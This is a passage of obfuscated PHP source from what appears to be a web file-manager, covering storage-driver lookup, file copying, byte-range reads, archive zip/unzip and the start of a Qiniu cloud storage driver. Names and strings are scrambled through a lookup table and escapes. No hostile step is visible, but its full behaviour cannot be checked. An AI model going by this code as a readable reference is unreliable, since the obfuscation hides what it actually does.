$èèˆß¡->fileOutImageServer($ÖÀ·Í¬¬, $³£à£¡); } return $èèˆß¡->fileOutImage($ÖÀ·Í¬¬, $³£à£¡); } private static function driverIsSame($éäùÃĞ­, $Áß¾ŸßØ) { $ şª™Î =& $_SERVER[´È¥ö†ö]; $ö‚¥–æ¶ = $éäùÃĞ­->getType(); $İÛŞÇ†¡ = $Áß¾ŸßØ->getType(); if ($ö‚¥–æ¶ != $İÛŞÇ†¡) { return !1; } if ($ö‚¥–æ¶ == $ şª™Î[833]) { return !0; } if ($ö‚¥–æ¶ == $ şª™Î[109]) { return !0; } if ($éäùÃĞ­->pathDriver == $Áß¾ŸßØ->pathDriver) { return !0; } return !1; } public static function copyUpdate($üøíøƒ†, $·¸á) { $áÆİöı =& $_SERVER[´È¥ö†ö]; if (!IO::exist($üøíøƒ†)) { return !1; } if (!IO::exist($·¸á)) { IO::mkdir($·¸á); } $¤êÙ”Ğ = array_to_keyvalue(self::listAllSimple($üøíøƒ†), $áÆİöı[87]); $úŞıœˆö = array_to_keyvalue(self::listAllSimple($·¸á), $áÆİöı[87]); $óÅäõÅ« = array(); $åÛ‘ç÷« = array(); foreach ($¤êÙ”Ğ as $”–—†©Í => $—ñ”’ó) { if (isset($úŞıœˆö[$”–—†©Í])) { if ($—ñ”’ó[$áÆİöı[78]] == 1) { continue; } if ($úŞıœˆö[$”–—†©Í][$áÆİöı[79]] == $—ñ”’ó[$áÆİöı[79]]) { continue; } } if ($—ñ”’ó[$áÆİöı[78]] == 1) { $åÛ‘ç÷«[] = $·¸á . $áÆİöı[8] . trim($”–—†©Í, $áÆİöı[8]); continue; } $«›É¡›ƒ = strstr(trim($”–—†©Í, $áÆİöı[8]), $áÆİöı[8]) ? get_path_father($”–—†©Í) : $áÆİöı[12]; $óÅäõÅ«[] = array($áÆİöı[1240] => $—ñ”’ó[$áÆİöı[89]], $áÆİöı[1241] => rtrim($·¸á, $áÆİöı[8]) . $áÆİöı[8] . $«›É¡›ƒ, $áÆİöı[1242] => $—ñ”’ó); } $×¿Ò×İ = array($áÆİöı[232] => $óÅäõÅ«, $áÆİöı[78] => $åÛ‘ç÷«); Hook::trigger($áÆİöı[1243], $üøíøƒ†, $·¸á, $×¿Ò×İ); foreach ($åÛ‘ç÷« as $—ñ”’ó) { IO::mkdir($—ñ”’ó); } foreach ($óÅäõÅ« as $—ñ”’ó) { IO::copy($—ñ”’ó[$áÆİöı[1240]], $—ñ”’ó[$áÆİöı[1241]], REPEAT_REPLACE); } } public static function fileSubstr($Ù®Å§à‹, $²¦Ã —Ú, $ñ¤µûŞ = false) { $‚ªÂïí =& $_SERVER[´È¥ö†ö]; $ÊÅ´ıÓ = self::driverMake($Ù®Å§à‹); $“—ŠéØ£ = $ÊÅ´ıÓ->size($Ù®Å§à‹); $÷»ü•°š = $²¦Ã —Ú; $Àâğ©í = $ñ¤µûŞ; if ($²¦Ã —Ú < 0) { $²¦Ã —Ú = $“—ŠéØ£ + $²¦Ã —Ú; } if ($ñ¤µûŞ === !1) { $ñ¤µûŞ = $“—ŠéØ£ - $²¦Ã —Ú; } if ($²¦Ã —Ú + $ñ¤µûŞ > $“—ŠéØ£) { $ñ¤µûŞ = $“—ŠéØ£ - $²¦Ã —Ú; } if (!$“—ŠéØ£ && $ÊÅ´ıÓ->getType() == $‚ªÂïí[109] && !$ÊÅ´ıÓ->exist($Ù®Å§à‹)) { $ƒšÎ€”Í = get_path_this($Ù®Å§à‹); $íŞıƒŞ = parse_url_query($ƒšÎ€”Í); if (is_array($íŞıƒŞ) && isset($íŞıƒŞ[$‚ªÂïí[32]])) { $ƒšÎ€”Í = urldecode($íŞıƒŞ[$‚ªÂïí[32]]); } throw new Exception($‚ªÂïí[1244] . LNG($‚ªÂïí[1245]) . $‚ªÂïí[1042] . clear_html($ƒšÎ€”Í) . $‚ªÂïí[12]); } if ($ñ¤µûŞ <= 0) { return $‚ªÂïí[12]; } if ($²¦Ã —Ú < 0 || $²¦Ã —Ú >= $“—ŠéØ£ || $ñ¤µûŞ > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\x65\122\x65\141\x64\40\145\162\162\x6f\162\41\x20\x73\164\141\162\x74\75{$²¦Ã —Ú}\x3b\154\145\x6e\x67\x74\150\x3d{$ñ¤µûŞ}\73\x20\x73\151\x7a\145\x3d{$“—ŠéØ£}\73"); } $›ƒ¡Ì¹€ = $ÊÅ´ıÓ->fileSubstr($Ù®Å§à‹, $²¦Ã —Ú, $ñ¤µûŞ); if (!$›ƒ¡Ì¹€ && $ñ¤µûŞ && isset($GLOBALS[$‚ªÂïí[1246]])) { throw new Exception($GLOBALS[$‚ªÂïí[1246]][$‚ªÂïí[1247]]); } return $›ƒ¡Ì¹€; } private static function driverMake(&$¦Ç×¼’) { $—šŞ¡‘À =& $_SERVER[´È¥ö†ö]; $Îñë¥’ = KodIO::parse($¦Ç×¼’); if (!self::$driverListSystem) { $«ßÃıö› = Model($—šŞ¡‘À[843])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($«ßÃıö›, $—šŞ¡‘À[486]); } if ($Îñë¥’[$—šŞ¡‘À[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Îñë¥’[$—šŞ¡‘À[486]]]) { throw new Exception($—šŞ¡‘À[1248]); return !1; } $¦Ç×¼’ = $Îñë¥’[$—šŞ¡‘À[1249]]; $ìòşô´Ÿ = self::driverGet($Îñë¥’, $¦Ç×¼’); return $ìòşô´Ÿ; } private static function driverGet($„¸ï£¿¿, &$›×´¯óç) { $åÏ³¦ÍË =& $_SERVER[´È¥ö†ö]; $Ø “³Óï = $„¸ï£¿¿[$åÏ³¦ÍË[1250]]; $ŒüÙéôé = $„¸ï£¿¿[$åÏ³¦ÍË[486]]; switch ($„¸ï£¿¿[$åÏ³¦ÍË[33]]) { case KodIO::KOD_IO: $éé¢ÆÂ™ = self::$driverListSystem[$ŒüÙéôé]; break; case KodIO::KOD_SOURCE: $›×´¯óç = $ŒüÙéôé . $›×´¯óç; $éé¢ÆÂ™ = array($åÏ³¦ÍË[1251] => $åÏ³¦ÍË[1252], $åÏ³¦ÍË[6] => $„¸ï£¿¿); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ˆšÎƒÈâ = $GLOBALS[$åÏ³¦ÍË[1253]]; self::$driverListUser = array_to_keyvalue($ˆšÎƒÈâ, $åÏ³¦ÍË[486]); } $éé¢ÆÂ™ = self::$driverListUser[$ŒüÙéôé]; break; case KodIO::KOD_SHARE_LINK: $éé¢ÆÂ™ = array($åÏ³¦ÍË[1251] => $åÏ³¦ÍË[1254], $åÏ³¦ÍË[6] => $„¸ï£¿¿); $í²ÇıŒÕ = Action($åÏ³¦ÍË[1255])->sharePathInfo($„¸ï£¿¿[$åÏ³¦ÍË[87]]); $›×´¯óç = $í²ÇıŒÕ[$åÏ³¦ÍË[193]]; if (!$í²ÇıŒÕ[$åÏ³¦ÍË[193]]) { $›ºˆ˜î­ = Model($åÏ³¦ÍË[678])->getInfo($í²ÇıŒÕ[$åÏ³¦ÍË[679]]); $›×´¯óç = KodIO::clear($›ºˆ˜î­[$åÏ³¦ÍË[1256]] . $„¸ï£¿¿[$åÏ³¦ÍË[1249]]); $„¸ï£¿¿[$åÏ³¦ÍË[571]] = $›ºˆ˜î­; $„¸ï£¿¿[$åÏ³¦ÍË[1231]] = $›×´¯óç; $éé¢ÆÂ™ = array($åÏ³¦ÍË[1251] => $åÏ³¦ÍË[1257], $åÏ³¦ÍË[6] => $„¸ï£¿¿); } break; case KodIO::KOD_SHARE_ITEM: $éé¢ÆÂ™ = array($åÏ³¦ÍË[1251] => $åÏ³¦ÍË[1258], $åÏ³¦ÍË[6] => $„¸ï£¿¿); $›ºˆ˜î­ = Model($åÏ³¦ÍË[678])->getInfo($„¸ï£¿¿[$åÏ³¦ÍË[486]]); if ($›ºˆ˜î­[$åÏ³¦ÍË[193]] == $åÏ³¦ÍË[230]) { $›×´¯óç = KodIO::clear($›ºˆ˜î­[$åÏ³¦ÍË[1256]] . $„¸ï£¿¿[$åÏ³¦ÍË[1249]]); $„¸ï£¿¿[$åÏ³¦ÍË[571]] = $›ºˆ˜î­; $„¸ï£¿¿[$åÏ³¦ÍË[1231]] = $›×´¯óç; $éé¢ÆÂ™ = array($åÏ³¦ÍË[1251] => $åÏ³¦ÍË[1259], $åÏ³¦ÍË[6] => $„¸ï£¿¿); } else { if (!$›×´¯óç) { $›×´¯óç = $›ºˆ˜î­[$åÏ³¦ÍË[193]]; } } break; default: $›×´¯óç = $„¸ï£¿¿[$åÏ³¦ÍË[87]]; $éé¢ÆÂ™ = array($åÏ³¦ÍË[1251] => $åÏ³¦ÍË[1260]); break; } $ËÖŞˆË¯ = $„¸ï£¿¿[$åÏ³¦ÍË[87]]; if (!isset(self::$driverCache[$ËÖŞˆË¯])) { $£ıÂéğ = strtolower($éé¢ÆÂ™[$åÏ³¦ÍË[98]]); $÷êñø€ü = $GLOBALS[$åÏ³¦ÍË[6]][$åÏ³¦ÍË[92]][$åÏ³¦ÍË[902]]; $¤°²¸ˆñ = $åÏ³¦ÍË[77] . (isset($÷êñø€ü[$£ıÂéğ]) ? $÷êñø€ü[$£ıÂéğ] : ucfirst($£ıÂéğ)); if (!class_exists($¤°²¸ˆñ)) { show_json("{$¤°²¸ˆñ}\40\x6e\157\164\40\x65\x78\151\163\x74\x73\x21", !1); } $áıêĞ¯ = isset($éé¢ÆÂ™[$åÏ³¦ÍË[6]]) ? $éé¢ÆÂ™[$åÏ³¦ÍË[6]] : !1; self::$driverCache[$ËÖŞˆË¯] = new $¤°²¸ˆñ($áıêĞ¯); } $Ø­³Ğ¹š = self::$driverCache[$ËÖŞˆË¯]; $Ø­³Ğ¹š->pathDriver = $Ø “³Óï; $Ø­³Ğ¹š->pathBase = $åÏ³¦ÍË[12]; if (isset($éé¢ÆÂ™[$åÏ³¦ÍË[6]][$åÏ³¦ÍË[1261]])) { $Ø­³Ğ¹š->pathBase = rtrim($éé¢ÆÂ™[$åÏ³¦ÍË[6]][$åÏ³¦ÍË[1261]], $åÏ³¦ÍË[8]) . $åÏ³¦ÍË[8]; $›×´¯óç = $Ø­³Ğ¹š->pathBase . ltrim($›×´¯óç, $åÏ³¦ÍË[8]); } $›×´¯óç = $Ø­³Ğ¹š->getPath($›×´¯óç); if (isset($„¸ï£¿¿[$åÏ³¦ÍË[1231]])) { $›×´¯óç = $„¸ï£¿¿[$åÏ³¦ÍË[1231]]; } $Ø­³Ğ¹š->path = $›×´¯óç; return $Ø­³Ğ¹š; } public static function errorTips($œ¨ÃÁ®û = false) { $–é¶ØàÍ =& $_SERVER[´È¥ö†ö]; static $„ìƒµã­ = array(); $şü­Š‡ã = 1000; if ($œ¨ÃÁ®û === -1) { return $„ìƒµã­ ? $„ìƒµã­[count($„ìƒµã­) - 1] : $–é¶ØàÍ[12]; } if ($œ¨ÃÁ®û === !1) { return implode($–é¶ØàÍ[287], $„ìƒµã­); } if (count($„ìƒµã­) >= $şü­Š‡ã) { $„ìƒµã­ = array_slice($„ìƒµã­, $şü­Š‡ã * 0.5, $şü­Š‡ã); } $„ìƒµã­[] = $œ¨ÃÁ®û; write_log($–é¶ØàÍ[176] . ACTION . $–é¶ØàÍ[1262] . $œ¨ÃÁ®û, $–é¶ØàÍ[1263]); } public static function getLastError($·ŠçöË = '') { $ŸµŞ°× = self::errorTips(-1); return $ŸµŞ°× ? $ŸµŞ°× : $·ŠçöË; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¸Ô¼şÂ; if ($¸Ô¼şÂ) { return $¸Ô¼şÂ; } $³Ğ¨†ä¥ = IO::init($_SERVER[´È¥ö†ö][8]); return $³Ğ¨†ä¥; } private static function iconvSystem($°ªŒÈ«’) { return self::local()->iconvSystem($°ªŒÈ«’); } private static function iconvApp($å…» ƒÕ) { return self::local()->iconvApp($å…» ƒÕ); } public static function zipFolder($ïØÔè¶, $Äğá¯ú” = "\x7a\151\x70", $â‹”ˆ = '', $´‡¦è’ = REPEAT_RENAME) { $£€š”Î§ =& $_SERVER[´È¥ö†ö]; $Œ»ä½ûê = IO::listPath($ïØÔè¶); if (!$Œ»ä½ûê) { return !1; } $Œ»ä½ûê = array_merge($Œ»ä½ûê[$£€š”Î§[85]], $Œ»ä½ûê[$£€š”Î§[86]]); return self::zip($Œ»ä½ûê, $Äğá¯ú”, $â‹”ˆ, $´‡¦è’); } public static function zip($ğ¼áî¿‰, $î´¶½Ñ— = "\172\151\160", $¼­Œêå = '', $é›ÛœÈ = REPEAT_RENAME) { $§ÏïÙ³¹ =& $_SERVER[´È¥ö†ö]; if (is_string($ğ¼áî¿‰) && $ğ¼áî¿‰) { $ğ¼áî¿‰ = array(array($§ÏïÙ³¹[87] => $ğ¼áî¿‰)); } $Š—™ñ£— = self::init($ğ¼áî¿‰[0][$§ÏïÙ³¹[87]]); $ûÂÄÉáè = self::info($ğ¼áî¿‰[0][$§ÏïÙ³¹[87]]); $Ïû¾¹¶¡ = $§ÏïÙ³¹[12]; $ò„“êâÚ = $§ÏïÙ³¹[12]; $•õ®À = $§ÏïÙ³¹[12]; if ($¼­Œêå && substr($¼­Œêå, -1, 1) != $§ÏïÙ³¹[8]) { $ò„“êâÚ = get_path_father($¼­Œêå); $•õ®À = get_path_this($¼­Œêå); } else { $ò„“êâÚ = self::pathFather($ûÂÄÉáè[$§ÏïÙ³¹[87]]); $•õ®À = $ûÂÄÉáè[$§ÏïÙ³¹[32]] . $§ÏïÙ³¹[10] . $î´¶½Ñ—; if (count($ğ¼áî¿‰) > 1) { $Áíæ¬¦ü = IO::info($ò„“êâÚ); $•õ®À = $Áíæ¬¦ü[$§ÏïÙ³¹[32]] . $§ÏïÙ³¹[10] . $î´¶½Ñ—; } if ($¼­Œêå) { $ò„“êâÚ = $¼­Œêå; } } if ($Š—™ñ£—->getType() == $§ÏïÙ³¹[109]) { $„®Ô¸Êã = self::init($ò„“êâÚ); $ä”çİÚ× = $„®Ô¸Êã->getType() == $§ÏïÙ³¹[109] ? $ò„“êâÚ : get_path_father($Š—™ñ£—->path); $ä”çİÚ× = rtrim($ä”çİÚ×, $§ÏïÙ³¹[8]) . $§ÏïÙ³¹[8]; mk_dir($ä”çİÚ×); } else { $Ïû¾¹¶¡ = TEMP_FILES . $§ÏïÙ³¹[1264] . time() . rand_string(8) . $§ÏïÙ³¹[8]; mk_dir($Ïû¾¹¶¡); file_put_contents($Ïû¾¹¶¡ . $§ÏïÙ³¹[1265], $§ÏïÙ³¹[12]); $ä”çİÚ× = $Ïû¾¹¶¡; } $–Ï”›Í´ = IO::info($ä”çİÚ×); if (!$–Ï”›Í´ || !$–Ï”›Í´[$§ÏïÙ³¹[235]]) { show_json(LNG($§ÏïÙ³¹[1266]), !1); } $äøà¤Ö = self::zipFileList($ğ¼áî¿‰, $Ïû¾¹¶¡); foreach ($äøà¤Ö as $·şÌÍ¶Ú => $Ä÷¶Æò) { $äøà¤Ö[$·şÌÍ¶Ú] = self::iconvSystem($Ä÷¶Æò); } $‰ŸËê€Ú = get_filename_auto($ä”çİÚ× . $•õ®À, $§ÏïÙ³¹[12], $é›ÛœÈ); KodArchive::create(self::iconvSystem($‰ŸËê€Ú), $äøà¤Ö); if (!IO::exist($‰ŸËê€Ú)) { if ($Ïû¾¹¶¡) { del_dir($Ïû¾¹¶¡); } write_log($§ÏïÙ³¹[1267] . $‰ŸËê€Ú, $§ÏïÙ³¹[399]); show_json(LNG($§ÏïÙ³¹[1268]), !1); } if (!$Ïû¾¹¶¡) { return $‰ŸËê€Ú; } $ã¡õÉõ¯ = self::move($‰ŸËê€Ú, $ò„“êâÚ, $é›ÛœÈ); if ($Ïû¾¹¶¡) { del_dir($Ïû¾¹¶¡); } if (!$‰ŸËê€Ú) { write_log($§ÏïÙ³¹[1269] . $‰ŸËê€Ú . $§ÏïÙ³¹[1270] . $ò„“êâÚ, $§ÏïÙ³¹[399]); show_json(LNG($§ÏïÙ³¹[1268]), !1); } return $ã¡õÉõ¯; } public static function unzip($¾Çæì, $®©Œœ¾Ô, $ñØƒ«ìË = "\x2d\x31", $ê÷ü–Í = "\x72\145\160\154\x61\143\x65") { $ôó¦‘»“ =& $_SERVER[´È¥ö†ö]; $šğõàŠŸ = parent::info($¾Çæì); if (!$šğõàŠŸ) { show_json(LNG($ôó¦‘»“[1271]), !1); } $¾ìÈÙÊÇ = IO::infoFullSimple($®©Œœ¾Ô); if (!$¾ìÈÙÊÇ) { $®©Œœ¾Ô = IO::mkdir($®©Œœ¾Ô); } if (isset($¾ìÈÙÊÇ[$ôó¦‘»“[193]]) && trim($¾ìÈÙÊÇ[$ôó¦‘»“[87]], $ôó¦‘»“[8]) != trim($®©Œœ¾Ô, $ôó¦‘»“[8])) { $ŸÉâˆ¦€ = KodIO::make($¾ìÈÙÊÇ[$ôó¦‘»“[192]]); $ÄùŒÏ¶ú = IO::fileNameAuto($ŸÉâˆ¦€, $¾ìÈÙÊÇ[$ôó¦‘»“[32]], REPEAT_RENAME_FOLDER, !0); $®©Œœ¾Ô = IO::mkdir($ŸÉâˆ¦€ . $ÄùŒÏ¶ú); } $ñØƒ«ìË = $ñØƒ«ìË && $ñØƒ«ìË != $ôó¦‘»“[1272] ? @json_decode($ñØƒ«ìË, !0) : -1; $¡ŒÅºñ¶ = self::unzipPart($¾Çæì, $ñØƒ«ìË); if (!$¡ŒÅºñ¶ || !IO::exist($¡ŒÅºñ¶[$ôó¦‘»“[232]])) { show_json(LNG($ôó¦‘»“[108]), !1); } $òŸÊ¯¶Ù = $¡ŒÅºñ¶[$ôó¦‘»“[1273]][count($¡ŒÅºñ¶[$ôó¦‘»“[1273]]) - 1]; if ($òŸÊ¯¶Ù[$ôó¦‘»“[1274]] == -1 || substr($òŸÊ¯¶Ù[$ôó¦‘»“[32]], -1, 1) == $ôó¦‘»“[8]) { $ğÉàí = $¡ŒÅºñ¶[$ôó¦‘»“[1275]] . rand_string(10) . $ôó¦‘»“[8]; mk_dir($ğÉàí); $ãŠßÒ”Ö = count($¡ŒÅºñ¶[$ôó¦‘»“[1273]]) == 1 ? IO::ext($¾Çæì) : get_path_ext($¡ŒÅºñ¶[$ôó¦‘»“[232]]); $†àª½áÔ = KodArchive::extract(self::iconvSystem($¡ŒÅºñ¶[$ôó¦‘»“[232]]), $ğÉàí, $òŸÊ¯¶Ù[$ôó¦‘»“[1274]], $ÄùŒÏ¶ú, $ãŠßÒ”Ö); self::unzipErrorCheck($†àª½áÔ, array($ôó¦‘»“[1276], $¾Çæì, $ãŠßÒ”Ö, $®©Œœ¾Ô, $¡ŒÅºñ¶)); Hook::trigger($ôó¦‘»“[1277], $ğÉàí); recursion_dir($ğÉàí, $æßÍˆú·, $ç¥àö¡ú, 0); $¯éÎü¨Ò = array_merge($æßÍˆú·, $ç¥àö¡ú); $…ì¯é— = array(); foreach ($¯éÎü¨Ò as $ô¸Ë•¨±) { $ ÌÉéì = IO::move(self::iconvApp($ô¸Ë•¨±), $®©Œœ¾Ô, $ê÷ü–Í); if ($ ÌÉéì) { $…ì¯é—[] = $ ÌÉéì; } } del_dir($ğÉàí); } else { $ ÌÉéì = IO::move($¡ŒÅºñ¶[$ôó¦‘»“[232]], $®©Œœ¾Ô, $ê÷ü–Í, get_path_this($òŸÊ¯¶Ù[$ôó¦‘»“[32]])); if ($ ÌÉéì) { $…ì¯é—[] = $ ÌÉéì; } } return $…ì¯é— ? $…ì¯é— : !1; } public static function unzipList($Ö÷ò¦) { $«‡ÃĞÆË =& $_SERVER[´È¥ö†ö]; $Ø÷Ó¼Š = isset($Ö÷ò¦[$«‡ÃĞÆË[1278]]) ? $Ö÷ò¦[$«‡ÃĞÆË[1278]] : !1; $ËÏ²ğ = isset($Ö÷ò¦[$«‡ÃĞÆË[1274]]) ? @json_decode($Ö÷ò¦[$«‡ÃĞÆË[1274]], !0) : -1; $„…¶ÍÃ = self::unzipPart($Ö÷ò¦[$«‡ÃĞÆË[87]], $ËÏ²ğ); if (!$„…¶ÍÃ || !IO::exist($„…¶ÍÃ[$«‡ÃĞÆË[232]])) { show_json(LNG($«‡ÃĞÆË[108]), !1); } $İ‘£Şé = $„…¶ÍÃ[$«‡ÃĞÆË[1273]][count($„…¶ÍÃ[$«‡ÃĞÆË[1273]]) - 1]; $úÉ˜Ë³Û = in_array(IO::ext($„…¶ÍÃ[$«‡ÃĞÆË[232]]), array($«‡ÃĞÆË[399], $«‡ÃĞÆË[1279], $«‡ÃĞÆË[1280], $«‡ÃĞÆË[1281], $«‡ÃĞÆË[1282], $«‡ÃĞÆË[1283])); if (!$Ø÷Ó¼Š && ($İ‘£Şé[$«‡ÃĞÆË[1274]] == -1 || $úÉ˜Ë³Û)) { $å©¿ßË = $„…¶ÍÃ[$«‡ÃĞÆË[1275]] . get_path_this($„…¶ÍÃ[$«‡ÃĞÆË[232]]) . $«‡ÃĞÆË[1284]; if (!IO::exist($å©¿ßË)) { $§…‡ÉÂü = $İ‘£Şé[$«‡ÃĞÆË[1274]] == -1 ? get_path_ext(IO::pathThis($Ö÷ò¦[$«‡ÃĞÆË[87]])) : get_path_ext($„…¶ÍÃ[$«‡ÃĞÆË[232]]); $¢–ŸÂ´§ = KodArchive::listContent(self::iconvSystem($„…¶ÍÃ[$«‡ÃĞÆË[232]]), !0, $§…‡ÉÂü); self::unzipErrorCheck($¢–ŸÂ´§, array($«‡ÃĞÆË[1285], $Ö÷ò¦, $„…¶ÍÃ)); @file_put_contents($å©¿ßË, json_encode($¢–ŸÂ´§[$«‡ÃĞÆË[1286]])); } return @json_decode(IO::getContent($å©¿ßË), !0); } IO::fileOut($„…¶ÍÃ[$«‡ÃĞÆË[232]], $Ø÷Ó¼Š, get_path_this($İ‘£Şé[$«‡ÃĞÆË[32]])); die; } private static function zipFileList($óíåªü„, $ş¯ÉãÂì = false) { $½–Úéµ =& $_SERVER[´È¥ö†ö]; $¤Î¯Â›² = array(); foreach ($óíåªü„ as $ÔöËÈë¡) { $í‘ÎœØä = $ÔöËÈë¡[$½–Úéµ[87]]; if ($ş¯ÉãÂì) { $í‘ÎœØä = self::copy($ÔöËÈë¡[$½–Úéµ[87]], $ş¯ÉãÂì, $½–Úéµ[895]); } else { $ÖÀ‘ŠÏÑ = self::init($ÔöËÈë¡[$½–Úéµ[87]]); if ($ÖÀ‘ŠÏÑ->getType() == $½–Úéµ[109]) { $í‘ÎœØä = $ÖÀ‘ŠÏÑ->path; } } if ($í‘ÎœØä && self::local()->exist($í‘ÎœØä)) { $¤Î¯Â›²[$ÔöËÈë¡[$½–Úéµ[87]]] = $í‘ÎœØä; } } if (!empty($¤Î¯Â›²)) { return array_values($¤Î¯Â›²); } show_json(LNG($½–Úéµ[1245]), !1); } private static function localFilePath($‚Ö—ĞŞè) { $Èƒê¯û =& $_SERVER[´È¥ö†ö]; $¨—±ù•² = KodIO::parse($‚Ö—ĞŞè); if ($¨—±ù•²[$Èƒê¯û[33]] == KodIO::KOD_SOURCE) { $•¼¤óô = Model($Èƒê¯û[901])->fileInfoGet(KodIO::sourceID($‚Ö—ĞŞè)); if (!$•¼¤óô[$Èƒê¯û[87]]) { show_json($Èƒê¯û[1287], !1); } $‚Ö—ĞŞè = $•¼¤óô[$Èƒê¯û[87]]; } $óğÏõƒ› = self::init($‚Ö—ĞŞè); if ($óğÏõƒ›->pathParse[$Èƒê¯û[1231]]) { $‚Ö—ĞŞè = $óğÏõƒ›->pathParse[$Èƒê¯û[1231]]; $óğÏõƒ› = self::init($‚Ö—ĞŞè); } $Ğ«¼øÅ = $óğÏõƒ›->getType(); if ($Ğ«¼øÅ == $Èƒê¯û[109] || $Ğ«¼øÅ == $Èƒê¯û[1288]) { if (!$óğÏõƒ›->exist($óğÏõƒ›->path)) { show_json(LNG($Èƒê¯û[108]), !1); } return $óğÏõƒ›->path; } return !1; } public static function unzipPart($Ö±»í”¢, $¸‡‰¤  = -1) { $Ê·î´ =& $_SERVER[´È¥ö†ö]; $ûãí®ò = IO::pathThis($Ö±»í”¢); if (!$¸‡‰¤  || $¸‡‰¤  == -1) { $øÁ‚Ñª° = array(array($Ê·î´[32] => $ûãí®ò, $Ê·î´[1274] => -1)); $øÁ‚Ñª°[0][$Ê·î´[1289]] = $øÁ‚Ñª°[0][$Ê·î´[32]]; } else { if (is_array($¸‡‰¤ )) { $øÁ‚Ñª° = $¸‡‰¤ ; $­ŠÚÃâ = count($øÁ‚Ñª°) - 1; for ($½«®Ê“ç = 0; $½«®Ê“ç <= $­ŠÚÃâ; $½«®Ê“ç++) { $Ú¼èˆË” = $øÁ‚Ñª°[$½«®Ê“ç]; $·µú¶Ğ = get_path_this($Ú¼èˆË”[$Ê·î´[32]]) . (checkExtSafe($Ú¼èˆË”[$Ê·î´[32]]) ? $Ê·î´[12] : $Ê·î´[1290]); $øÁ‚Ñª°[$½«®Ê“ç][$Ê·î´[1289]] = $Ê·î´[1291] . intval($Ú¼èˆË”[$Ê·î´[1274]]) . $Ê·î´[473] . $·µú¶Ğ; if ($½«®Ê“ç == 0) { continue; } $øÁ‚Ñª°[$½«®Ê“ç][$Ê·î´[1289]] = $øÁ‚Ñª°[$½«®Ê“ç - 1][$Ê·î´[1289]] . $Ê·î´[1292] . $øÁ‚Ñª°[$½«®Ê“ç][$Ê·î´[1289]]; } } } if (!is_array($øÁ‚Ñª°) || count($øÁ‚Ñª°) == 0) { return !1; } $÷´ùõ‹í = $øÁ‚Ñª°[count($øÁ‚Ñª°) - 1]; if (!IO::exist($Ö±»í”¢)) { return !1; } $÷òªõÅ = TEMP_FILES . $Ê·î´[1293] . kodIO::hashPathSafe($Ö±»í”¢) . $Ê·î´[8]; $ğÕ½éÊ = $÷òªõÅ . $÷´ùõ‹í[$Ê·î´[1289]]; mk_dir($÷òªõÅ); file_put_contents(TEMP_FILES . $Ê·î´[1265], $Ê·î´[12]); if (IO::exist($ğÕ½éÊ)) { return array($Ê·î´[232] => $ğÕ½éÊ, $Ê·î´[1273] => $øÁ‚Ñª°, $Ê·î´[1275] => $÷òªõÅ); } $øÜ›Ã€¸ = self::localFilePath($Ö±»í”¢); if (!$øÜ›Ã€¸) { $øÜ›Ã€¸ = $÷òªõÅ . $Ê·î´[1294]; if (!IO::exist($øÜ›Ã€¸)) { self::copy($Ö±»í”¢, $÷òªõÅ, !1, get_path_this($øÜ›Ã€¸)); } } if (!$øÜ›Ã€¸ || !IO::exist($øÜ›Ã€¸)) { return !1; } if ($÷´ùõ‹í[$Ê·î´[1274]] == -1) { return array($Ê·î´[232] => $øÜ›Ã€¸, $Ê·î´[1273] => $øÁ‚Ñª°, $Ê·î´[1275] => $÷òªõÅ); } $üœ–ç×„ = $øÜ›Ã€¸; foreach ($øÁ‚Ñª° as $½«®Ê“ç => $Ú¼èˆË”) { if (!$Ú¼èˆË” || $Ú¼èˆË”[$Ê·î´[1274]] == $Ê·î´[1272]) { break; } if (substr($Ú¼èˆË”[$Ê·î´[32]], -1, 1) == $Ê·î´[8]) { break; } $ îãŠ = in_array(get_path_ext($Ú¼èˆË”[$Ê·î´[1289]]), array($Ê·î´[399], $Ê·î´[1279], $Ê·î´[1280], $Ê·î´[1281], $Ê·î´[1282], $Ê·î´[1283])); $ë††´òß = $½«®Ê“ç == count($øÁ‚Ñª°) - 1 && $ îãŠ; $¤½èÀŸ² = $÷òªõÅ . $Ú¼èˆË”[$Ê·î´[1289]]; $¥Ä¥™Í = $÷òªõÅ . get_path_this($Ú¼èˆË”[$Ê·î´[32]]); if (IO::exist($¤½èÀŸ²)) { $üœ–ç×„ = $¤½èÀŸ²; continue; } $Ö¥ª±Ø¤ = $½«®Ê“ç == 0 ? get_path_ext($ûãí®ò) : get_path_ext($üœ–ç×„); $™ë¸Ã‰ò = KodArchive::extract(self::iconvSystem($üœ–ç×„), $÷òªõÅ, $Ú¼èˆË”[$Ê·î´[1274]], $ß–êÆ¬ì, $Ö¥ª±Ø¤); self::unzipErrorCheck($™ë¸Ã‰ò, array($Ê·î´[1295], $Ö±»í”¢, $øÁ‚Ñª°, $Ú¼èˆË”, $¤½èÀŸ²)); if (IO::exist($¥Ä¥™Í)) { IO::rename($¥Ä¥™Í, get_path_this($¤½èÀŸ²)); } $üœ–ç×„ = $¤½èÀŸ²; } $ğÕ½éÊ = $üœ–ç×„; return array($Ê·î´[232] => $üœ–ç×„, $Ê·î´[1273] => $øÁ‚Ñª°, $Ê·î´[1275] => $÷òªõÅ); } private static function unzipErrorCheck($ó“æ‘˜§, $ğı¶¿®© = false) { $ÒûË›Ëº =& $_SERVER[´È¥ö†ö]; if ($ó“æ‘˜§[$ÒûË›Ëº[1296]]) { return !0; } write_log(array($ÒûË›Ëº[1297], $ó“æ‘˜§, $ğı¶¿®©), $ÒûË›Ëº[1298]); show_json($ÒûË›Ëº[1299] . json_encode($ó“æ‘˜§[$ÒûË›Ëº[1286]]), !1); die; } } goto Dä¿¥ÁéŠ; fê“¸ÍÃµ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Úàüá´À) { parent::__construct(); require_once SDK_DIR . $_SERVER[´È¥ö†ö][1528]; $this->_init($Úàüá´À); } public function _init($Ê‚È›çí) { $şëŞÃŞü =& $_SERVER[´È¥ö†ö]; $this->config = $Ê‚È›çí; foreach ($Ê‚È›çí as $„´…È‡“ => $ˆ• Š»î) { if (isset($this->{$„´…È‡“})) { $this->{$„´…È‡“} = $ˆ• Š»î; } } if (empty($this->accessKey) || empty($this->secret) || 